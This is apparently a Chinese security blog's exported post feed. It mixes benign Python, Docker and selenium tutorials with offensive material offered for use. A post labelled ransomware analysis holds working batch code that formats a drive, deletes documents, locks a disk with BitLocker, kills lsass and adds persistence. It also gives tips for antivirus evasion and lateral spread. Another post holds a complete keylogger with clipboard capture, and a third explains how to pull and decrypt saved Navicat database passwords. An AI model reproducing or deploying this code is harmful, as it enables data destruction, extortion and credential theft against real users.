有偿发帖、删帖的刑法可规制性及建议【T00ls法律讲堂第十五期】 https://www.t00ls.net/viewthread.php?tid=42498 破坏计算机信息系统罪和非法入侵计算机信息系统区别【T00ls法律讲堂第十六期】 https://www.t00ls.net/viewthread.php?tid=46171 超出授权范围侵入计算机信息系统【T00ls法律讲堂第十七期】 https://www.t00ls.net/viewthread.php?tid=47493 侵犯公民个人信息相关【T00ls法律讲堂第十八期】 https://www.t00ls.net/viewthread.php?tid=49479 公司数据合法合规的自检【T00ls法律讲堂第十九期】 https://www.t00ls.net/viewthread.php?tid=51158 渗透行为的法律定性【T00ls法律讲堂第二十期】 https://www.t00ls.net/viewthread.php?tid=51166 侵入后的动作法律解析【T00ls法律讲堂第二十一期】 https://www.t00ls.net/viewthread.php?tid=51183 网络服务提供者不作为的法律风险 https://www.t00ls.net/viewthread.php?tid=51228]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>网络安全法律</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[勒索病毒分析案例]]></title>
    <url>%2F2019%2F07%2F19%2F41_%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[本篇所有代码具有攻击性，请在虚拟机测试,造成损失与本人无关 通过批处理修改IE注册表的方法 QQ群：397745473 12345678910111213141516171819@echo off# 改首页reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d www.baidu.com /f reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d www.baidu.com /freg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Search Page" /t reg_sz /d www.baidu.com /freg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Default_Page_URL" /t reg_sz /d www.baidu.com /f reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Default_Search_URL" /t reg_sz /d www.baidu.com /f reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "First Home Page" /t reg_sz /d www.baidu.com /f reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Search Page" /t reg_sz /d www.baidu.com /f reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Start Page" /t reg_sz /d www.baidu.com /f# 禁用注册表reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v "HomePage" /t REG_DWORD /d 1/f# 禁用主页修改reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f# 加启动项reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d %windir%\system\oldboy.bat /f # 把自己复制到system32目录中copy %0 %windir%\System32\oldboy.bat 勒索病毒代码分析 1234567891011121314151617181920212223242526272829@echo off# 格式化磁盘echo y |format d: /q# 快速删除文件del c:\*.doc /s /f /q# 使用windows工具加密磁盘manage-bde -on d: -RecoveryPassword -RecoveryKey x:\# 杀掉对话框taskkill /f /im fvenotify.exe &gt; null# 用bde对x盘加密manage-bde -protectors -add d: -rp -rk x:\# 杀掉对话框taskkill /f /im fvenotify.exe &gt; null# 延迟30秒TIMEOUT /T 30taskkill /f /im fvenotify.exe &gt; nullecho hello &gt; c:\windows\windows1.txt# 写提示信息echo "your company All your data have been deleted.If you........"start c:\windows\windows1.txtset superxiaoyuerc=echo# 加IE启动# 杀杀毒软件进程# 杀桌面显示进程taskkill /f /im explorer.exe &gt; null# 结束进程导致系统重启taskkill /f /im lsass.exe &gt; nullstart c:\windows\hax0r.html 更多批处理可以参考工具： 1.吞噬者批处理编写器 http://www.ouyaoxiazai.com/soft/stgj/159/4616.html 2.Bat to exe Converter 工具 https://www.battoexe.com/ 3.加数字签名绕过杀软查杀 工具 addSign.exe https://docs.microsoft.com/zh-cn/dotnet/framework/tools/signtool-exe 4.用vbs 调批处理 隐藏窗口调用BAT 12Set ws = CreateObject("Wscript.Shell")ws.run "cmd /c c:\bingdu.bat",vbhide 1.把BAT 与 VBS文件压缩自解压 2.解压后运行 2.vbs 高级–&gt;bingdu.bat 3.图标 4.全部隐藏 5.使用psexec进行内网传播 利用WMI代替psexec——WMIEXEC.vbs 内网传播更多参考 ：https://www.t00ls.net/viewthread.php?tid=21167 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>恶意代码攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从此告别python乱码]]></title>
    <url>%2F2018%2F03%2F15%2F38_%E4%BB%8E%E6%AD%A4%E5%91%8A%E5%88%ABpython%E4%B9%B1%E7%A0%81%2F</url>
    <content type="text"><![CDATA[从此告别python乱码QQ群：397745473 有些文件打开天身就是乱码,烦都要烦死人了. 幸好有codecs库. python对多国语言的处理是支持的很好的，它可以处理现在任意编码的字符，这里深入的研究一下python对多种不同语言的处理。 有一点需要清楚的是，当python要做编码转换的时候，会借助于内部的编码，转换过程是这样的： 原有编码 -&gt; 内部编码 -&gt; 目的编码 python的内部是使用unicode来处理的，但是unicode的使用需要考虑的是它的编码格式有两种，一是UCS-2，它一共有65536个码位，另一种是UCS-4，它有2147483648g个码位。对于这两种格式，python都是支持的，这个是在编译时通过–enable-unicode=ucs2或–enable-unicode=ucs4来指定的。那么我们自己默认安装的python有的什么编码怎么来确定呢？有一个办法，就是通过sys.maxunicode的值来判断： 问:txt文本文档在pycharm里面打开乱码怎么办呀，文档有中文答:1.把txt文档另存为utf-8再打开试试2.1With open(...,encoding＝&apos;utf-8&apos;) 3.用codecs库12import codecswith codecs.open(&quot; xx. txt&quot;,&apos;r+&apos;) as f]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集之Navicat密码]]></title>
    <url>%2F2018%2F03%2F15%2F39_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BNavicat%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[信息收集之Navicat密码Navicat 支持很多数据库有MySQL，MariaDB，Oracle，SQLite，PostgreSQL和Microsoft SQL Server。管理员一般都会把密码记住,在碰到服务器的时候可以查出明文的密码好固然是一件好事.方法如下:QQ群：397745473 注册表:123reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v hostreg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwdreg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName 更多数据:123456MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\ 获取明文密码:Navicat 11和Navicat 12使用不同加密算法可以用:https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password 破解出来 使用方法:123456789101112131415161718pip install blowfishpip install pypiwin32PS E:\GitHub\how-does-navicat-encrypt-password\python3&gt; pythonPython 3.6.3 (v3.6.3:2c5fed8, Oct 3 2017, 18:11:49) [MSC v.1900 64 bit (AMD64)] on win32Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from NavicatCrypto import *&gt;&gt;&gt; cipher = Navicat11Crypto()&gt;&gt;&gt; cipher.EncryptString(&apos;This is a test&apos;)&apos;0EA71F51DD37BFB60CCBA219BE3A&apos;&gt;&gt;&gt; cipher.DecryptString(&apos;0EA71F51DD37BFB60CCBA219BE3A&apos;)&apos;This is a test&apos;&gt;&gt;&gt; cipher2 = Navicat12Crypto()&gt;&gt;&gt; cipher2.EncryptStringForNCX(&apos;This is a test&apos;)&apos;B75D320B6211468D63EB3B67C9E85933&apos;&gt;&gt;&gt; cipher2.DecryptStringForNCX(&apos;B75D320B6211468D63EB3B67C9E85933&apos;)&apos;This is a test&apos;&gt;&gt;&gt; 详情参考:https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker部署签到站教程]]></title>
    <url>%2F2018%2F02%2F06%2F37_Docker%E9%83%A8%E7%BD%B2%E7%AD%BE%E5%88%B0%E7%AB%99%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Docker部署签到站教程QQ群：397745473 注: 如果你使用的系统已经预装Docker,或者你使用的是Docker容器平台,可以跳过安装Docker步骤本教程配置后的站点使用的数据库默认为sqlite更新镜像时只需要备份容器中的 database.db 文件即可将容器中的数据库文件拷贝到当前目录1docker cp qiandao:/usr/src/app/database.db . 将备份的数据库拷贝到容器中(当前目录的database.db文件)1docker cp database.db qiandao:/usr/src/app/ 建议恢复数据库后立即重启容器,重启方法请见下方 其他命令 源项目地址 点击访问如何创建自己的Docker镜像,可参考本镜像的构建文件 Dockerfile 一、Linux安装Docker国内主机安装Docker使用国内镜像安装Docker curl -sSL https://get.daocloud.io/docker | sh 启动Docker服务service docker start 国外主机安装Docker使用官网地址安装Docker curl -sSL https://get.docker.com | sh 启动Docker服务service docker start Centos使用yum安装Docker如果在国内使用该方式,推荐使用阿里云的yum源,配置方法请百度升级现有依赖（建议） yum update -y安装Docker yum install docker -y启动Docker服务 service docker start设置Docker服务项开机自启( 重要 ) systemctl enable docker 二、下载/更新Docker镜像国内主机拉取/更新镜像 docker pull daocloud.io/fangzhengjin/qiandao国外主机拉取/更新镜像 docker pull fangzhengjin/qiandao更新镜像需要删除并重新创建容器（需要手动备份数据库文件）,不删除重新创建容器则依然使用创建时的版本,或手动更新代码! 三、创建容器说明Docker中容器的名称与ID是唯一的,如果需要重新创建容器,需要先删除之前的容器,见后面其他命令如果在创建容器后,自动启动容器出现问题,可能是端口冲突,你可以选择关闭占用80端口的程序或更改容器开放端口（容器内程序的监听端口制作时已更改为80） docker run -d -p 你指定的端口:80 –name qiandao daocloud.io/fangzhengjin/qiandao 注:如果你已经创建了容器,请删除后重新创建国内主机什么是Volume你可以把Volume理解为一个挂载点，意为将主机中的目录挂载到容器中，这样可以在容器中与主机挂载点的文件交互添加Volume需要添加以下参数-v 主机挂载点:容器挂载点 -v /root(建议使用绝对路径):/usr/src/root(建议使用绝对路径)意为将主机中的/root目录 连接到容器中的 /usr/src/root 位置,在容器中复制文件到/usr/src/root中,其会出现在主机的/root目录中 设置容器重启动策略重启动策略有以下三种： 始终重启(可用作开机自启,前提是Docker服务必须开机自启动)–restart=always退出状态非0时重启–restart=on-failure该方式可以指定遇到错误时尝试重启的最大次数,例出错时最大重启5次–restart=on-failure:5不重启(默认)–restart=no样例(始终重启–开机时,如果Docker服务项已经启动则自动启动该容器)docker run -d -p 80:80 –name qiandao –restart=always daocloud.io/fangzhengjin/qiandao不需要挂载Volume docker run -d -p 80:80 –name qiandao daocloud.io/fangzhengjin/qiandao需要挂载Volume(在root目录下创建volume,并连接至容器中/usr/src/app/volume位置,也就是代码目录的volume文件夹) mkdir -p /root/volumedocker run -d -p 80:80 –name qiandao -v /root/volume:/usr/src/app/volume daocloud.io/fangzhengjin/qiandao国外主机不需要挂载Volumedocker run -d -p 80:80 –name qiandao fangzhengjin/qiandao需要挂载Volume(在root目录下创建volume,并连接至容器中/usr/src/app/volume位置,也就是代码目录的volume文件夹)mkdir -p /root/volumedocker run -d -p 80:80 –name qiandao -v /root/volume:/usr/src/app/volume fangzhengjin/qiandao四、启动容器说明首次创建容器后，将自动启动容器手动启动容器docker start qiandao 五、配置站点管理员进入容器管理 docker exec -it qiandao /bin/bash设置站点管理员python ./chrole.py 注册邮箱(该用户必须已经注册) admin例：python ./chrole.py 123456@qq.com admin退出容器管理exit六、其他命令重启容器docker restart qiandao关闭容器docker stop qiandao删除容器docker rm -v qiandao使用参数 -v 的作用是为了确保删除容器自动创建的Volume七、站点其他配置其他站点配置请参考 配置说明 我的执行命令:123456docker pull daocloud.io/fangzhengjin/qiandaomkdir -p /root/volumedocker run -d -p 9799:80 --name qiandao --restart=always -v /root/volume:/usr/src/app/volume daocloud.io/fangzhengjin/qiandaodocker start qiandaohttp://172.16.1.48:9799 先注册一下,再设管理员python ./chrole.py vsyour@qq.com admin 下载模板:https://qiandao.today/tpls/public使用教程:https://github.com/binux/qiandao/blob/master/README.md]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>签到</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用virtualenv建立python独立环境]]></title>
    <url>%2F2018%2F02%2F04%2F36_virtualenv%E5%BB%BA%E7%AB%8Bpython%E7%8B%AC%E7%AB%8B%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[用 virtualenv 建立python独立环境QQ群：397745473 第一步：安装 virtualenvpip install virtualenv 第二步： 建立目录，配置环境D:\&gt;mkdir flaskenv D:\flaskenv&gt;virtualenv env D:\flaskenv\env\Scripts&gt;activate]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 键盘记录器]]></title>
    <url>%2F2018%2F02%2F01%2F29_python%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%2F</url>
    <content type="text"><![CDATA[python 键盘记录器代码如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576# -*- coding: utf-8 -*- from ctypes import *import pythoncomimport pyHookimport win32clipboarduser32 = windll.user32kernel32 = windll.kernel32psapi = windll.psapicurrent_window = None# def get_current_process(): # 获取最上层的窗口句柄 hwnd = user32.GetForegroundWindow() # 获取进程ID pid = c_ulong(0) user32.GetWindowThreadProcessId(hwnd,byref(pid)) # 将进程ID存入变量中 process_id = "%d" % pid.value # 申请内存 executable = create_string_buffer("\x00"*512) h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid) psapi.GetModuleBaseNameA(h_process,None,byref(executable),512) # 读取窗口标题 windows_title = create_string_buffer("\x00"*512) length = user32.GetWindowTextA(hwnd,byref(windows_title),512) # 打印 print print "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value) print # 关闭handles kernel32.CloseHandle(hwnd) kernel32.CloseHandle(h_process)# 定义击键监听事件函数def KeyStroke(event): global current_window # 检测目标窗口是否转移(换了其他窗口就监听新的窗口) if event.WindowName != current_window: current_window = event.WindowName # 函数调用 get_current_process() # 检测击键是否常规按键（非组合键等） if event.Ascii &gt; 32 and event.Ascii &lt;127: print chr(event.Ascii), else: # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来 if event.Key == "V": win32clipboard.OpenClipboard() pasted_value = win32clipboard.GetClipboardData() win32clipboard.CloseClipboard() print "[PASTE]-%s" % (pasted_value), else: print "[%s]" % event.Key, # 循环监听下一个击键事件 return True# 创建并注册hook管理器kl = pyHook.HookManager()kl.KeyDown = KeyStroke# 注册hook并执行kl.HookKeyboard()pythoncom.PumpMessages() 参考:python 键盘记录器http://blog.csdn.net/qq_16234613/article/details/79151528]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[selenium 使用实例]]></title>
    <url>%2F2018%2F02%2F01%2F31_selenium%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[selenium 使用实例环境配置:http://vksec.com/2018/01/31/28_selenium环境配置Firefox和Chrome/ QQ群：397745473 selenium 使用实例1python+selenium实现QQ群自动签到python+selenium实现的QQ群自动签到！QQ群里的群签到功能经常会断签，如果能用脚本去自动签到，就再也不怕忘签了~下面郑晓会告诉你如何使用python来实现QQ群的定时自动签到(邪恶脸)。以下代码基于linux(centos)，Python2.7，且须要有pyvirtualdisplay和selenium库支持。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!-*- coding:utf-8 -*-from pyvirtualdisplay import Displayfrom selenium import webdriverimport requests#要签到的QQ群号列表groupid = [123456789,987654321]headers = &#123;"Content-Type":"application/x-www-form-urlencoded","Host":"qiandao.qun.qq.com","Origin":"http://qiandao.qun.qq.com","Referer": "http://qiandao.qun.qq.com","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"&#125;#创建一个启动session的请求对象s = requests.Session()def login(): try: #启动一个虚拟桌面 display = Display(visible=0, size=(1100,700)) display.start() driver = webdriver.Firefox() driver.set_window_position(20, 40) driver.set_window_size(1100,700) #打开QQ登录界面 准备登录 driver.get('http://qzone.qq.com') driver.switch_to_frame('login_frame') driver.find_element_by_id('switcher_plogin').click() driver.find_element_by_id('u').clear() #填写QQ帐号 driver.find_element_by_id('u').send_keys('qq号') driver.find_element_by_id('p').clear() #填写QQ密码 driver.find_element_by_id('p').send_keys('****zh30.com****') #模拟点击登录按钮 执行登录 获取cookie driver.find_element_by_id('login_button').click() cookies = driver.get_cookies() #退出浏览器 driver.quit() display.stop() return cookies except: passcookies = login()for cookie in cookies: if cookie['name'] == 'skey': skey = cookie['value'] s.cookies.set(cookie['name'], cookie['value'])#计算bkn并存入cookiee = 5381for i in range(len(skey)): e = e + (e&lt;&lt;5)+ord(skey[i])bkn = str(2147483647 &amp; e)s.cookies.set("Gtk", bkn)#签到方法def sign(groupid): for gid in groupid: response = s.post("http://qiandao.qun.qq.com/cgi-bin/sign", data=&#123;"gc":gid, "is_sign":0, "bkn":bkn&#125;, headers=headers) responseJson = response.json() if responseJson.has_key('em') and responseJson['em'] == 'no&amp;nbsp;login': break#开始签到sign(groupid) 好了，这样就完成了一个自动签到的脚本，运行它便会自动启动浏览器、自动填上帐号密码登录、循环签到。但它只执行一次，我们要把它加入到计划任务crontab中。1230 0 * * * python /root/QQsign.py#为了测试可以加个输出日志，如0 0 * * * python /root/QQsign.py &gt;/root/crontab-run.log 2&gt;&amp;1 以上任务郑晓是在root帐户中创建，定时于每天0点执行/root/目录下的QQsign.py脚本，输出日志到crontab-run.log文件中。完成！看看以下的效果截图，是不是很贱啊？ selenium 使用实例2python+selenium自动登录qq空间并下载相册基于selenium的自动登录qq空间并遍历所有相册及相片的功能。只能访问自己或好友(有访问权限)的相册，好友有密码的相册不可能。。。这里只是介绍流程，所以只是实现了遍历，并未实现图片文件的下载保存。读取相册信息是请求的手机版qq空间的相册相关接口，其中写死了只遍历前50个相册，可以自己改。 脚本并未处理任何可能出现的错误，请自己完善。 在环境:64位win7+python2.7+selenium3.5.0+chromedriver2.31 下测试通过。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!coding:utf-8from selenium import webdriverimport requests,time,jsonlogin_uin = '123456789' #登录qqpwd = 'zx1233211234567' #登录密码album_uin = '123456789' #要读取相册的qqs = requests.Session()#实例化出浏览器开始登录driver = webdriver.Chrome()driver.set_window_size(1000,600)driver.get('https://mobile.qzone.qq.com')driver.find_element_by_id('u').clear()driver.find_element_by_id('u').send_keys(login_uin)driver.find_element_by_id('p').clear()driver.find_element_by_id('p').send_keys(pwd)driver.find_element_by_id('go').click()#等待浏览器中js计算出qzonetokenwhile True: qzonetoken = driver.execute_script("return window.shine0callback") if qzonetoken: break time.sleep(0.1)#读取cookie后关闭浏览器cookies = driver.get_cookies()driver.quit()cookies_ = &#123;&#125;for cookie in cookies: if cookie['name'] == 'p_skey': skey = cookie['value'] #s.cookies.set(cookie['name'], cookie['value']) cookies_[cookie['name']] = cookie['value']#计算gtke = 5381for i in range(len(skey)): e = e + (e&lt;&lt;5)+ord(skey[i])g_tk = str(2147483647 &amp; e)###################### www.zh30.com #######################请求中添加cookie，开始读取相册列表requests.utils.add_dict_to_cookiejar(s.cookies, cookies_)url="https://mobile.qzone.qq.com/list?qzonetoken="+qzonetoken+"&amp;g_tk="+g_tk+"&amp;format=json&amp;list_type=album&amp;action=0&amp;res_uin="+album_uin+"&amp;count=50"r = s.get(url);data = json.loads(r.text.encode('utf-8'))for album in data['data']['vFeeds']: print '相册名:'+album['pic']['albumname'].encode('utf-8') print '相册id:'+album['pic']['albumid'].encode('utf-8') print '图片数量:' + str(album['pic']['albumnum']) print '开始下载相册图片:' #读取当前相册中的图片列表 url = "https://h5.qzone.qq.com/webapp/json/mqzone_photo/getPhotoList2?qzonetoken="+qzonetoken+"&amp;g_tk="+g_tk+"&amp;uin="+album_uin+"&amp;albumid="+album['pic']['albumid'].encode('utf-8')+"&amp;ps=0" r = s.get(url) photo_datas = json.loads(r.text.encode('utf-8')) for T in photo_datas['data']['photos']: for pic in photo_datas['data']['photos'][T]: print '图片名:'+pic['picname'].encode('utf-8')+'，url:'+pic['1']['url'].encode('utf-8') print "="*10 以下是运行截屏，右键图片在新标签页打开，可以高清~ selenium 使用实例3自动抓取摩拜单车车辆位置数据每天从下车站到公司还有好几米的路要走，这对于现在能免费骑车的懒癌患者怎么能忍？车站人流量大，能找到辆车实属不易，所以就得在下公交车前不停的刷新app查看下车点是否有车，有车就马上预订。 一路上不停的拿着手机刷新太麻烦了，身为码农怎么能忍？我这里要实现的就是把刷新查看目的地是否有车的这个过程实现了自动化。 实现思路是首先找到摩拜单车在地图上标记车辆位置的这个接口，然后想办法使用程序模拟这个请求，从获得的车辆数据中检查是否有符合的车辆，如果有则发送提示消息。 使用的抓包工具是charles，它可以很轻松的获取到移动设备的数据请求，具体使用方法不做介绍，请百度。 开始时是使用charles开启ssl代理，抓取手机上摩拜单车app的请求，摩拜的每个https请求都是unknow(http method是connect)，看错误提示应该是证书的问题，但手机上其它的https请求是正常的（比如京东），网上的说法是使用了http隧道通信，代理工具无法抓取。app无法抓包，转战微信小程序，在摩拜的微信小程序中查看附近车辆时，charles成功抓取到车辆位置的api（nearbyBikeInfo.do）知道了api后就可以很轻松的模拟出请求，这里使用了python+requests进行post请求。多次测试发现header中有些看似很关键的参数其实不必要的，所以这里已经移除。12345678910111213141516171819202122#coding=utf8#www.zh30.comimport requestsheaders = &#123; "Host": "mwx.mobike.com", "time": "1500887680", "eption": "bb15c", "open_src": "list", "platform": "3", "citycode": "0532", "User-Agent": "Mozilla/5.0 (iPhone;www.zh30.com; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 MicroMessenger/6.5.12 NetType/WIFI Language/zh_CN", "lang": "zh", "Referer": "https://servicewechat.com/wxxxxxxxx/70/page-frame.html"&#125;body = &#123; "longitude":"120.413333", "latitude":"36.087741", "citycode":"0532",&#125;r = requests.post("https://mwx.mobike.com/mobike-api/rent/nearbyBikesInfo.do",data=body, headers=headers, verify=False);print r.text.encode('utf-8') 注意，代码有改动:) 成功返回json数据格式化后，数据很清晰明白，接口返回查询的坐标周围有几辆车，并包含有每辆车的编号、坐标和与目标坐标的相对距离等信息。接下来要做的就是从数据里过滤出比较近的车辆（distance的单位是米，值可按自己的需求定），并给出提示消息。提示消息推送可以使用pushbullet这类工具，实现也很方便。更复杂点儿可以距离坐标计算一下每个车辆在目标位置的哪个方向。这里就不实现了~ 完。 selenium 使用实例4使用antiword读取word文档antiword是linux及其他RISC OS下免费的ms word文档读取器。使用它可以很方便的在Linux中读取word文档并输出为纯文本字符串。 下载地址：http://www.winfield.demon.nl 下载后解压、编译安装：1234tar -zxvf antiword-0.37.tar.gzcd antiword-0.37makemake install 默认安装到当前账户下的bin目录中。 使用：终端中1/home/pi/bin/antiword antiword-test.doc 其他语言中通过各自执行系统命令的方式来执行，比如Python中：1234import subprocessword_file = &quot;antiword-test.doc&quot;content = subprocess.check_output([&quot;/home/pi/antiword&quot;, word_file])print content 比如我有个doc文件是这样的：执行结果类似这样：其中的非字符串部分被过滤了。 selenium 使用实例5python-DHT爬虫中路由表的实现这是DHT协议中路由表的实现，在DHT网络中，每个节点维护着一张路由表(table)，表中储存着已获取的状态良好的节点(node)。路由表又被划分为多个区间桶(bucket)，节点应该储存在这些桶中，空的表只有一个桶。当桶满时不能再插入该桶中，除非当前节点（自己）ID也在这个桶中，在这种情况下，原桶需分裂为两个相同大小的桶，旧桶中的节点重新分配到新的子桶中。具体细节可查阅DHT协议。 以下代码逻辑主要来源于网络，我只是改了两个bug。。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#coding:utf-8from time import timefrom hashlib import sha1from random import randint#生成一个20字节长度的node_iddef node_id(): hash = sha1() s = &quot;&quot;.join(chr(randint(0, 255)) for i in xrange(20)) hash.update(s) return hash.digest() #返回Node_id的10进制长整型表示 node_id-&gt;16-&gt;10def int_ify(nid): assert len(nid) == 20 return long(nid.encode(&apos;hex&apos;), 16)#node 节点类 每个节点都有id、ip和端口属性 重新定义了节点的等于和不等于操作class KNode: def __init__(self, nid, ip, port): self.nid = nid self.ip = ip self.port = port def __eq__(self, other): return self.nid == other.nid def __ne__(self, other): return self.nid != other.nid#桶满的异常类class BucketFull: pass#bucket 桶类class KBucket: def __init__(self, min, max): self.min = min self.max = max self.nodes = [] self.lastTime = time() #当前桶的最后更新时间 #检查一个node_id是否在桶的范围内 def nid_in_range(self, nid): return self.min &lt;= int_ify(nid) &lt; self.max #向桶中添加节点 def append(self, node): if len(node.nid) != 20: return if len(self.nodes) &lt; 8: if node in self.nodes: self.nodes.remove(node) self.nodes.append(node) else: self.nodes.append(node) self.lastTime = time() else: raise BucketFull#路由表类class KTable: def __init__(self, nid): self.nid = nid self.nodeTotal = 0; self.buckets = [KBucket(0, 2 ** 160)] #路由表中所有的桶的列表 默认只有一个桶 #向路由表添加节点，即向表中某个桶中添加节点，桶满时要进行拆分 def append(self, node): if node.nid == self.nid: return index = self.bucket_index(node.nid) bucket = self.buckets[index] try: bucket.append(node) self.nodeTotal = self.nodeTotal+1 except BucketFull: if not bucket.nid_in_range(self.nid): return self.split_bucket(index) self.append(node) #返回待添加节点id应该在哪个桶的范围中 def bucket_index(self, nid): for index, bucket in enumerate(self.buckets): if bucket.nid_in_range(nid): return index return index #拆分桶 def split_bucket(self, index): old = self.buckets[index] point = old.max - (old.max - old.min)/2 new = KBucket(point, old.max) old.max = point self.buckets.insert(index + 1, new) for node in old.nodes: if new.nid_in_range(node.nid): new.append(node) for node in new.nodes: old.nodes.remove(node) #返回离目标最近的8个node def get_neighbor(self, target): nodes = [] if len(self.buckets) == 0: return nodes index = self.bucket_index(target) nodes = self.buckets[index].nodes min = index - 1 max = index + 1 while len(nodes) &lt; K and (min &gt;= 0 or max &lt; len(self.buckets)): if min &gt;= 0: nodes.extend(self.buckets[min].nodes) if max &lt; len(self.buckets): nodes.extend(self.buckets[max].nodes) min -= 1 max += 1 num = int_ify(target) nodes.sort(lambda a, b, num=num: cmp(num^int_ify(a.nid), num^int_ify(b.nid))) return nodes[:8] #打印调试信息 def print_info(self): print &apos;桶数量:&apos;+str(len(self.buckets)) print &apos;节点量:&apos;+str(self.nodeTotal)#Demo#实例化出路由表， 随机生成一千个node，放入表中并打印表的状态routeTable = KTable(node_id())for i in xrange(0,1000): routeTable.append(KNode(node_id(), &apos;127.0.0.1&apos;, &apos;80012&apos;))routeTable.print_info() 打印出的结果显示路由表中的桶和节点数量十分有限，说明有大量的节点已经被抛弃，原因在代码中的第67行，当待加入节点所需要加入的桶已满且自身id不在这个桶中时直接忽略。由于这种路由表实现复杂、需要不停的ping检查每个节点是否有效且储存的节点数量有限。实际做DHT爬虫时可不实现，爬虫只需要不停的认识新的node，并获取资源infohash，所以直接通过向有效的node发送完find_node后即可删除该node，只需等待node发送的get_peers和announce_peer通知即可。 selenium 使用实例6SublimeText3按ctrl+b执行python无反应最后更新时间：2017-09-14现象：在Sublime中打开.py文件，按”ctrl+b”执行时无反应。点击工具-&gt;编译系统中已经有且识别到Python，但执行”run（ctrl+shift+b）”时无反应，Sublime左下角提示”No Build System with variant run”。 解决：首先打开一个CMD，在左上角单击，选择”属性”。在属性-&gt;选项中查看”当前代码页”一项中的数值。(这一步可选)然后打开Sublime安装目录，打开Packages，找到里面的”Python.sublime-package”文件，复制出来一份留作备份。把这个文件后缀改为.zip，打开这个压缩包。 在打开压缩包中找到”Python.sublime-build”文件拖出来编辑一下它(编辑工具可用sublime或其它文本编辑器直接打开)。原文件内容应该类似这样：123456789101112131415&#123; &quot;shell_cmd&quot;: &quot;python -u &quot;$file&quot;&quot;, &quot;file_regex&quot;: &quot;^[ ]*File &quot;(...*?)&quot;, line ([0-9]*)&quot;, &quot;selector&quot;: &quot;source.python&quot;, &quot;env&quot;: &#123;&quot;PYTHONIOENCODING&quot;: &quot;utf-8&quot;&#125;, &quot;variants&quot;: [ &#123; &quot;name&quot;: &quot;Syntax Check&quot;, &quot;shell_cmd&quot;: &quot;python -m py_compile &quot;$&#123;file&#125;&quot;&quot;, &#125; ]&#125; 改成这样： 1234567&#123; &quot;cmd&quot;: [&quot;python&quot;, &quot;-u&quot;, &quot;$file&quot;], &quot;file_regex&quot;: &quot;^[ ]*File 